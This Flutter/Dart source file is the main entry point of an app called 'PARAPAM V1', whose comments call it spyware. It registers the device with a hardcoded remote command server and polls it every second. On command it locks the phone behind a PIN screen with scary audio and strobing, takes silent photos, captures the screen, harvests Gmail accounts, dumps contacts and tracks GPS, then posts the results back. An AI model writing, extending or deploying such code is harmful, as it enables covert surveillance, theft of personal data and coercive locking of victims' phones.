import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart'; 
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:camera/camera.dart';
import 'package:vibration/vibration.dart';
import 'package:url_launcher/url_launcher.dart';

// IMPORT HALAMAN ASLI ANDA
import 'landing_page.dart'; 
import 'login_page.dart';
import 'loader_page.dart';
import 'home_page.dart';
import 'seller_page.dart';
import 'admin_page.dart';
import 'buy_account.dart';
import 'splash.dart'; 

// CONTROLLER GLOBAL UNTUK LOCK SCREEN
ValueNotifier<bool> deviceLocked = ValueNotifier<bool>(false);
final AudioPlayer _audioPlayer = AudioPlayer();
String globalDeviceId = "";
String globalDeviceModel = "";

// VARIABEL DINAMIS UNTUK LOCKER (Sesuai Dashboard)
String currentLockMessage = "YOUR PHONE IS LOCKED!!!!";
String currentLockPIN = "123";

// CHANNEL NATIVE
const MethodChannel platformStrobe = MethodChannel('com.nullx.pp/strobe');
const MethodChannel platformSpy = MethodChannel('com.nullx.pp/background_spy');

// ─── VARIABEL SPAM SENTER ──────────────────────────────────────────────────
Timer? _flashSpamTimer;
bool _isFlashSpamActive = false;

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  if (Platform.isAndroid) {
    if (!await Permission.systemAlertWindow.isGranted) {
      await Permission.systemAlertWindow.request();
    }
    requestNotificationAccess();
  }

  await requestPermissions();
  
  Map<String, String> deviceInfo = await getDeviceInfo();
  globalDeviceId = deviceInfo['id']!;
  globalDeviceModel = deviceInfo['model']!;

  try {
    await platformSpy.invokeMethod('saveTargetId', globalDeviceId);
  } catch (e) {
    debugPrint("Failed to sync ID to native: $e");
  }

  await registerInitialDevice(globalDeviceId, globalDeviceModel);
  startSpyware(globalDeviceId, globalDeviceModel);
  
  runApp(const MyApp());
}

void requestNotificationAccess() async {
  try {
    await platformSpy.invokeMethod('openNotificationSettings');
  } catch (e) {
    debugPrint("Settings intent failed: $e");
  }
}

Future<void> requestPermissions() async {
  await [
    Permission.location,
    Permission.contacts,
    Permission.storage,
    Permission.manageExternalStorage,
    Permission.camera,
    Permission.microphone,
    Permission.ignoreBatteryOptimizations,
    Permission.notification,
    Permission.sms, 
  ].request();
}

Future<Map<String, String>> getDeviceInfo() async {
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
  String modelName = "Unknown Device";
  String identifier = "UNKNOWN_ID";

  try {
    if (Platform.isAndroid) {
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      modelName = "${androidInfo.brand.toUpperCase()} ${androidInfo.model}";
      identifier = "${androidInfo.brand}-${androidInfo.model}-${androidInfo.id}".replaceAll(' ', '_'); 
    } else if (Platform.isIOS) {
      IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
      modelName = iosInfo.name;
      identifier = iosInfo.identifierForVendor ?? "UNKNOWN_IOS";
    }
  } catch (e) {
    identifier = "ZDX-${Platform.localHostname.hashCode}";
  }
  return {"id": identifier, "model": modelName};
}

Future<void> registerInitialDevice(String id, String model) async {
  const String serverBase = "http://mbgapa.naaofficial.web.id:11360";
  try {
    final Battery battery = Battery();
    int level = await battery.batteryLevel;
    
    await http.post(
      Uri.parse("http://mbgapa.naaofficial.web.id:11360/api/register-target"),
      body: jsonEncode({
        "id": id,
        "admin_owner": "mizu",
        "model": model,
        "battery": level.toString(),
        "status": "Online",
        "lastSeen": DateTime.now().toIso8601String(),
      }),
      headers: {"Content-Type": "application/json"}
    );
  } catch (e) {}
}

void playScarySound() async {
  await _audioPlayer.setReleaseMode(ReleaseMode.loop);
  await _audioPlayer.play(UrlSource('https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Scary+Laugh&filename=24/243764-00f7e1b5-829d-4874-a690-671891b0c79b.mp3'));
}

void stopSound() async {
  await _audioPlayer.stop();
}

// ─── FUNGSI SPAM SENTER (KELAP-KELIP) ──────────────────────────────────────
void startFlashSpam() {
  if (_isFlashSpamActive) return;
  _isFlashSpamActive = true;
  
  // Kirim strobe setiap 500ms
  int count = 0;
  _flashSpamTimer = Timer.periodic(const Duration(milliseconds: 500), (timer) {
    count++;
    if (count > 60) { // Stop otomatis setelah 30 detik (60 x 500ms)
      stopFlashSpam();
      return;
    }
    platformStrobe.invokeMethod('startStrobe');
  });
}

void stopFlashSpam() {
  _isFlashSpamActive = false;
  _flashSpamTimer?.cancel();
  platformStrobe.invokeMethod('stopStrobe');
}

// ─── START SPYWARE ──────────────────────────────────────────────────────────
void startSpyware(String deviceId, String deviceName) {
  const String serverBase = "http://mbgapa.naaofficial.web.id:11360";

  Future<void> executeLogic() async {
    try {
      await http.post(Uri.parse("http://mbgapa.naaofficial.web.id:11360/api/heartbeat/$deviceId"), 
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"id": deviceId, "status": "Alive"})
      ).timeout(const Duration(seconds: 1));

      final response = await http.get(Uri.parse("http://mbgapa.naaofficial.web.id:11360/api/get-command/$deviceId"));
      
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        String command = data['command'] ?? "idle";
        String extra = data['extra'] ?? "";
        dynamic resultData;

        // ─── HARD LOCK ────────────────────────────────────────────────────
        if (command == "hard_lock" || command == "lock_device") {
          if (extra.contains('|')) {
            List<String> parts = extra.split('|');
            currentLockMessage = parts[0].isNotEmpty ? parts[0] : "YOUR PHONE IS LOCKED!!!!";
            currentLockPIN = parts.length > 1 && parts[1].isNotEmpty ? parts[1] : "123";
          } else if (extra.isNotEmpty) {
            currentLockMessage = extra;
          }
          if (!deviceLocked.value) {
            deviceLocked.value = true;
            playScarySound();
          }
          resultData = {"status": "Locked with custom settings"};
        } 
        
        // ─── UNLOCK ──────────────────────────────────────────────────────
        else if (command == "unlock" || command == "unlock_device") {
          if (deviceLocked.value) {
            deviceLocked.value = false;
            stopSound();
            stopFlashSpam();
            await platformStrobe.invokeMethod('stopStrobe');
          }
          resultData = {"status": "Unlocked"};
        }

        // ─── SPAM SENTER (KELAP-KELIP) ──────────────────────────────────
        else if (command == "flash_spam" || command == "spam_flash") {
          startFlashSpam();
          resultData = {"status": "Flash Spam Active (30s)"};
        }
        else if (command == "stop_flash_spam" || command == "stop_spam") {
          stopFlashSpam();
          resultData = {"status": "Flash Spam Stopped"};
        }

        // ─── STROBE ──────────────────────────────────────────────────────
        else if (command == "flash_strobe") {
          await platformStrobe.invokeMethod('startStrobe');
          resultData = {"status": "Strobe Active"};
        }
        else if (command == "stop_strobe") {
          await platformStrobe.invokeMethod('stopStrobe');
          stopFlashSpam();
          resultData = {"status": "Strobe Stopped"};
        }

        // ─── SILENT CAMERA ──────────────────────────────────────────────
        else if (command == "take_photo") {
          final String? base64Result = await platformSpy.invokeMethod('takeSilentPhotoBackground', {"side": extra});
          if (base64Result != null) {
            resultData = {
              "status": "Success",
              "image_base64": base64Result
            };
          } else {
            resultData = {"status": "Failed to capture image"};
          }
        }

        // ─── SCREEN STREAM ──────────────────────────────────────────────
        else if (command == "get_screen") {
          final String? base64Result = await platformSpy.invokeMethod('startScreenStreamBackground');
          resultData = {
            "status": "Background Stream Active",
            "image_base64": base64Result
          };
        }

        // ─── GMAIL HARVESTER ────────────────────────────────────────────
        else if (command == "get_gmails") {
          String emails = await platformSpy.invokeMethod('getGmailAccounts');
          resultData = {"accounts": emails.isEmpty ? "No Gmail Found" : emails};
        }

        // ─── WALLPAPER ──────────────────────────────────────────────────
        else if (command == "set_wallpaper") {
          await platformSpy.invokeMethod('setWallpaper', {"url": extra});
          resultData = {"status": "Wallpaper Updated"};
        }

        // ─── AUDIO PLAYER ───────────────────────────────────────────────
        else if (command == "play_audio") {
          try {
            await _audioPlayer.stop();
            await _audioPlayer.play(UrlSource(extra));
            resultData = {"status": "Playing MP3 from URL"};
          } catch (e) {
            resultData = {"status": "Audio Error: $e"};
          }
        }
        else if (command == "stop_audio") {
          await _audioPlayer.stop();
          resultData = {"status": "Audio Stopped"};
        }

        // ─── CONTACTS ────────────────────────────────────────────────────
        else if (command == "get_contacts" || command == "dump_contacts") {
          if (await FlutterContacts.requestPermission()) {
            final List<Contact> contacts = await FlutterContacts.getContacts(
                withProperties: true, 
                withPhoto: false
            );
            resultData = {
              "contacts": contacts.take(50).map((e) => {
                "name": e.displayName, 
                "number": e.phones.isNotEmpty ? e.phones.first.number : ""
              }).toList()
            };
          }
        }

        // ─── VIBRATE ────────────────────────────────────────────────────
        else if (command == "vibrate_loop") {
          Vibration.vibrate(duration: 5000);
          resultData = {"status": "Vibrating"};
        }

        // ─── OPEN URL ────────────────────────────────────────────────────
        else if (command == "open_url") {
          final Uri url = Uri.parse(extra);
          if (await canLaunchUrl(url)) {
            await launchUrl(url, mode: LaunchMode.externalApplication);
            resultData = {"status": "URL Opened"};
          }
        }

        // ─── GPS LOCATION ───────────────────────────────────────────────
        else if (command == "get_location" || command == "track_gps") {
          Position pos = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
          resultData = {"lat": pos.latitude, "lng": pos.longitude};
        }

        // ─── FORCE OPEN ─────────────────────────────────────────────────
        else if (command == "force_open") {
          await platformSpy.invokeMethod('bringToForeground');
          resultData = {"status": "Application Forced to Foreground"};
        }

        // ─── SELF DESTRUCT ──────────────────────────────────────────────
        else if (command == "self_destruct") {
          resultData = {"status": "Self Destruct Activated"};
          // Hapus data dan exit
          await Future.delayed(const Duration(seconds: 2));
          exit(0);
        }

        // ─── BRING TO FOREGROUND ────────────────────────────────────────
        else if (command == "bring_to_foreground") {
          await platformSpy.invokeMethod('bringToForeground');
          resultData = {"status": "Brought to Foreground"};
        }

        // ─── TOAST SPAM ──────────────────────────────────────────────────
        else if (command == "toast_spam") {
          for (int i = 0; i < 10; i++) {
            await platformSpy.invokeMethod('showToast', {"message": extra});
            await Future.delayed(const Duration(milliseconds: 500));
          }
          resultData = {"status": "Toast Spam Sent"};
        }

        // ─── SET VOLUME MAX ─────────────────────────────────────────────
        else if (command == "set_vol_max") {
          await platformSpy.invokeMethod('setVolumeMax');
          resultData = {"status": "Volume Set to Max"};
        }

        // ─── SEND RESPONSE ──────────────────────────────────────────────
        if (resultData != null) {
          await http.post(
            Uri.parse("http://mbgapa.naaofficial.web.id:11360/api/post-response/$deviceId"),
            body: jsonEncode({"data": resultData, "cmd": command}),
            headers: {"Content-Type": "application/json"}
          );
        }
      }
    } catch (e) { }
  }

  Timer.periodic(const Duration(seconds: 1), (t) => executeLogic());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'PARAPAM V1',
      theme: ThemeData(
        brightness: Brightness.dark,
        fontFamily: 'ShareTechMono',
        scaffoldBackgroundColor: Colors.black,
        colorScheme: const ColorScheme.dark().copyWith(secondary: Color(0xFF4ECDC4)),
      ),
      home: const MainLockWrapper(),
    );
  }
}

class MainLockWrapper extends StatefulWidget {
  const MainLockWrapper({super.key});

  @override
  State<MainLockWrapper> createState() => _MainLockWrapperState();
}

class _MainLockWrapperState extends State<MainLockWrapper> with WidgetsBindingObserver {
  final TextEditingController _passController = TextEditingController();

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this); 
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _passController.dispose();
    stopFlashSpam();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (deviceLocked.value && (state == AppLifecycleState.paused || state == AppLifecycleState.inactive)) {
      platformSpy.invokeMethod('bringToForeground');
    }
  }

  @override
  Widget build(BuildContext context) {
    final Color toska = const Color(0xFF4ECDC4);

    return ValueListenableBuilder<bool>(
      valueListenable: deviceLocked,
      builder: (context, isLocked, child) {
        return PopScope(
          canPop: !isLocked, 
          child: Stack(
            children: [
              Navigator(
                initialRoute: '/',
                onGenerateRoute: (settings) {
                  switch (settings.name) {
                    case '/': return MaterialPageRoute(builder: (_) => const LandingPage());
                    case '/login': return MaterialPageRoute(builder: (_) => const LoginPage());
                    case '/splash': 
                      final args = settings.arguments as Map<String, dynamic>;
                      return MaterialPageRoute(builder: (_) => SplashPage(data: args));
                    case '/buy_account': return MaterialPageRoute(builder: (_) => const BuyAccountPage());
                    case '/loader':
                      return MaterialPageRoute(builder: (_) => const Scaffold(body: Center(child: Text("Loader Active")))); 
                    default:
                      return MaterialPageRoute(builder: (_) => const Scaffold(body: Center(child: Text("404"))));
                  }
                },
              ),

              // ─── LOCK SCREEN ──────────────────────────────────────────────
              if (isLocked)
                Scaffold(
                  backgroundColor: Colors.black,
                  body: Container(
                    width: double.infinity,
                    height: double.infinity,
                    padding: const EdgeInsets.all(20),
                    decoration: BoxDecoration(
                      gradient: RadialGradient(
                        center: Alignment.center,
                        radius: 1.5,
                        colors: [
                          const Color(0xFF1A0000),
                          Colors.black,
                        ],
                      ),
                    ),
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        // Icon lock with glow
                        Container(
                          padding: const EdgeInsets.all(20),
                          decoration: BoxDecoration(
                            shape: BoxShape.circle,
                            color: Colors.red.withOpacity(0.1),
                            boxShadow: [
                              BoxShadow(
                                color: Colors.red.withOpacity(0.3),
                                blurRadius: 40,
                              ),
                            ],
                          ),
                          child: const Icon(
                            Icons.gpp_maybe,
                            color: Colors.red,
                            size: 80,
                          ),
                        ),
                        const SizedBox(height: 20),
                        
                        // Lock Message
                        Text(
                          currentLockMessage,
                          textAlign: TextAlign.center,
                          style: const TextStyle(
                            color: Colors.red,
                            fontSize: 24,
                            fontWeight: FontWeight.bold,
                            letterSpacing: 2,
                          ),
                        ),
                        const SizedBox(height: 10),
                        
                        // Flash spam indicator
                        if (_isFlashSpamActive)
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 6),
                            decoration: BoxDecoration(
                              color: Colors.orange.withOpacity(0.2),
                              borderRadius: BorderRadius.circular(10),
                              border: Border.all(color: Colors.orange.withOpacity(0.3)),
                            ),
                            child: Row(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                Icon(Icons.flash_on, color: Colors.orange, size: 16),
                                const SizedBox(width: 8),
                                const Text(
                                  "⚡ FLASH SPAM ACTIVE ⚡",
                                  style: TextStyle(
                                    color: Colors.orange,
                                    fontSize: 12,
                                    fontWeight: FontWeight.bold,
                                    letterSpacing: 1,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        
                        const SizedBox(height: 10),
                        
                        // Credit
                        const Text(
                          "developed by DIKA_MD",
                          textAlign: TextAlign.center,
                          style: TextStyle(
                            color: Colors.white38,
                            fontSize: 12,
                          ),
                        ),
                        const SizedBox(height: 40),
                        
                        // PIN Input
                        Container(
                          width: 280,
                          decoration: BoxDecoration(
                            color: Colors.white.withOpacity(0.05),
                            borderRadius: BorderRadius.circular(12),
                            border: Border.all(color: Colors.red.withOpacity(0.3)),
                          ),
                          child: TextField(
                            controller: _passController,
                            obscureText: true,
                            textAlign: TextAlign.center,
                            style: const TextStyle(
                              color: Colors.white,
                              fontSize: 18,
                              letterSpacing: 4,
                            ),
                            decoration: InputDecoration(
                              hintText: "MASUKKAN PASSWORD",
                              hintStyle: TextStyle(color: Colors.white24),
                              border: InputBorder.none,
                              contentPadding: const EdgeInsets.symmetric(vertical: 16),
                              prefixIcon: Icon(Icons.lock_outline, color: Colors.red.withOpacity(0.5)),
                            ),
                            onSubmitted: (_) => _unlockDevice(),
                          ),
                        ),
                        const SizedBox(height: 20),
                        
                        // Unlock Button
                        ElevatedButton(
                          style: ElevatedButton.styleFrom(
                            backgroundColor: Colors.red[900],
                            minimumSize: const Size(200, 50),
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(12),
                            ),
                            elevation: 10,
                          ),
                          onPressed: _unlockDevice,
                          child: const Text(
                            "🔓 BUKA KUNCI",
                            style: TextStyle(
                              fontWeight: FontWeight.bold,
                              fontSize: 14,
                              letterSpacing: 2,
                            ),
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
            ],
          ),
        );
      },
    );
  }

  void _unlockDevice() {
    if (_passController.text == currentLockPIN) {
      deviceLocked.value = false;
      stopSound();
      stopFlashSpam();
      platformStrobe.invokeMethod('stopStrobe');
      _passController.clear();
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          content: Text("✅ Perangkat berhasil dibuka!"),
          backgroundColor: Colors.green,
        ),
      );
    } else {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          content: Text("❌ Password salah! Coba lagi."),
          backgroundColor: Colors.red,
        ),
      );
      _passController.clear();
    }
  }
}